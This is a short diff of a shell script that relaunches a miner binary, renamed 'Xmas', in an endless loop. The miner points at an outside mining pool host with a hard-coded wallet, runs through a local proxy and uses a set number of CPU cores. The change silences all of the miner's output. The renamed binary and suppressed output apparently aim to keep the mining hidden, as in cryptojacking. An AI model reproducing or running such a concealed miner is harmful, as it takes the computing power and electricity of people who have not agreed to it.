@@ -95,6 +95,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10107 -u solo:Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1@$provider -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081
+./Xmas --donate-level 1 -o fastxyz.teatspray.uk:10107 -u solo:Q0105002628a239b471e885555ecdfbca3ef53ce3b5c8a90beb205d389fa14f4de7aa921dfc44a1@$provider -p $currentdate --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:1081 1>/dev/null 2>&1
 sleep 10
 done
